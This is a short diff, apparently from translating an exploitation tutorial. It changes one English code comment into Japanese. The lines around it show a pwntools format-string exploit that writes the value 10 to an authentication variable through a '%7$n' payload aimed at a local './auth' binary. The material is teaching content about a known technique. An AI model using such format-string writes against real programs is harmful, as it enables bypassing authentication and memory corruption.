@@ -279,7 +279,7 @@ AUTH = 0x804c028
 p = process('./auth')
 
 payload = p32(AUTH)
-payload += b'|' * 6         # We need to write the value 10, AUTH is 4 bytes, so we need 6 more for %n
+payload += b'|' * 6         # 10 を書き込む必要があり、AUTH が 4 バイトなので、%n 用にあと 6 バイト必要
 payload += b'%7$n'
 
 
